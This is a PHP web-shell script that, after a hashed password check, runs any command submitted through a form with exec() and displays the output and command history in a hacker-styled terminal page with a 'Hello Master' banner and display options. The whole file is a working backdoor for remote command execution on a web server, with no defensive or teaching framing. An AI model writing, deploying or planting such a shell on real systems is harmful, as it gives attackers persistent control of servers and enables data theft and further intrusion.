<?php
session_start();

if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['pass'])) {
        if (hash("sha256", $_POST['pass']) === "68215fa3501ae17394bac692f12a5fe1cd6675a7c048d7307800956469f81057") {
            $_SESSION['loggedin'] = true;
        } else {
            die("<pre>Incorrect password.</pre>");
        }
    } else {
        echo '<form method="post" style="background:black;color:lime;padding:20px">
                <label>Password: </label>
                <input type="password" name="pass" autofocus>
                <input type="submit" value="Login">
              </form>';
        exit;
    }
}

$output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    // safer and complete error capture
    exec($cmd . " 2>&1", $lines);
    $output = implode("\n", $lines);
    $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output];
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>WelCome To PhiVault Arena !</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: monospace;
            padding: 20px;
        }
        .output-box {
            background-color: #111;
            border: 1px solid #444;
            padding: 15px;
            height: var(--panel-height, 400px);
            overflow-y: scroll;
            margin-bottom: 15px;
            font-size: var(--output-size, 14px);
            color: var(--output-color, white);
        }
        input[type="text"] {
            width: 80%;
            background-color: #111;
            color: lime;
            border: 1px solid #444;
            padding: 8px;
            font-size: var(--input-size, 14px);
        }
        input[type="submit"] {
            background-color: #222;
            color: lime;
            border: 1px solid #444;
            padding: 8px 16px;
        }
        select {
            margin-right: 10px;
        }
        .debug-toggle {
            color: cyan;
            margin-bottom: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h2>Hello Master - This is Linux CVRaman73674 5.15.0-133-generic #144-Ubuntu SMP x86_64 GNU/Linux</h2>

    <!-- UI Customizer -->
    <div style="margin-bottom: 15px;">
        <label>Font Size:</label>
        <select id="fontSize" onchange="updateSettings()">
            <option value="12px">12</option>
            <option value="14px">14</option>
            <option value="16px">16</option>
            <option value="18px">18</option>
            <option value="20px">20</option>
        </select>

        <label>Text Color:</label>
        <select id="textColor" onchange="updateSettings()">
            <option value="white">White</option>
            <option value="lime">Lime</option>
            <option value="cyan">Cyan</option>
            <option value="yellow">Yellow</option>
            <option value="red">Red</option>
        </select>

        <label>Shell Panel Height:</label>
        <select id="panelHeight" onchange="updateSettings()">
            <option value="300px">300px</option>
            <option value="400px">400px</option>
            <option value="500px">500px</option>
            <option value="600px">600px</option>
        </select>

        <span class="debug-toggle" onclick="toggleDebug()">[ Toggle Debug Mode ]</span>
    </div>

    <!-- Output Terminal -->
    <div class="output-box" id="terminal">
        <?php
        if (!empty($_SESSION['history'])) {
            foreach ($_SESSION['history'] as $entry) {
                echo "<span style='color:lime;'>$ " . htmlentities($entry['cmd']) . "</span><br>";
                echo "<pre class='cmd-output'>" . htmlentities($entry['output']) . "</pre>";
                echo "<pre class='debug-output' style='display:none;color:#888;font-size:11px;'>[DEBUG] Raw: " . var_export($entry['output'], true) . "</pre>";
            }
        }
        ?>
    </div>

    <!-- Command Input -->
    <form method="post">
        <input type="text" name="cmd" autofocus autocomplete="off" placeholder="Enter command">
        <input type="submit" value="Run">
    </form>

    <!-- JS to handle style persistence -->
    <script>
        const root = document.documentElement;

        function updateSettings() {
            const size = document.getElementById("fontSize").value;
            const color = document.getElementById("textColor").value;
            const height = document.getElementById("panelHeight").value;

            root.style.setProperty('--output-size', size);
            root.style.setProperty('--input-size', size);
            root.style.setProperty('--output-color', color);
            root.style.setProperty('--panel-height', height);

            localStorage.setItem("fontSize", size);
            localStorage.setItem("textColor", color);
            localStorage.setItem("panelHeight", height);
        }

        function applySavedSettings() {
            const savedSize = localStorage.getItem("fontSize") || "14px";
            const savedColor = localStorage.getItem("textColor") || "white";
            const savedHeight = localStorage.getItem("panelHeight") || "400px";

            root.style.setProperty('--output-size', savedSize);
            root.style.setProperty('--input-size', savedSize);
            root.style.setProperty('--output-color', savedColor);
            root.style.setProperty('--panel-height', savedHeight);

            document.getElementById("fontSize").value = savedSize;
            document.getElementById("textColor").value = savedColor;
            document.getElementById("panelHeight").value = savedHeight;
        }

        function toggleDebug() {
            document.querySelectorAll(".debug-output").forEach(el => {
                el.style.display = (el.style.display === "none") ? "block" : "none";
            });
        }

        // Apply saved settings on load
        applySavedSettings();

        // Auto scroll to latest
        const term = document.getElementById("terminal");
        term.scrollTop = term.scrollHeight;
    </script>
</body>
</html>
